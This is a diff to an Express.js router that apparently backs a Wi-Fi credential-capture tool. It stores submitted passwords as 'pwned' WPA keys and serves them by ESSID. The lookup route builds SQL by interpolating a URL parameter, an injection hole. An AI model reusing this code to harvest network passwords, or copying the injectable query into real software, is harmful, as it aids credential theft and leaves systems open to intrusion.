@@ -1,6 +1,7 @@
 const express = require('express');
 const router = express.Router();
 const query = require('../dbconnect')
+const reader = require('../important_data/reader')
 
 class pwned {
     constructor(psw1, psw2) {
@@ -20,7 +21,7 @@ router.get('/pwned', async (req, res) => {
 })
 
 router.get('/pwned/:id', async (req, res) => {
-    await query.GetSelectData('*', 'wpa_keys', `ID='${req.params.id}'`)
+    await query.GetSelectData('*', 'wpa_keys', `ESSID='${req.params.id}'`)
     .then(data => {
         res.json(data)
     })
@@ -34,7 +35,6 @@ router.post('/', async (req, res) => {
     var passwords = new pwned(req.body.Password, req.body.VerifyPass)
     await query.InsertData('wpa_keys',passwords.psw1, passwords.psw2)
 
-    console.log(passwords)
     res.json({
         status: 'Data inserted successfully'
     })
@@ -52,6 +52,16 @@ router.put('/:id', async (req, res) => {
                 status: err
             })
         })
+})
+
+router.get('/wireless', async (req, res) => {
+    await reader.ReadJsonFile('wireless_data')
+        .then(data => {
+            res.json(data)
+        })
+        .catch(err => {
+            res.json(err)
+        }) 
 })
 
 module.exports = router;
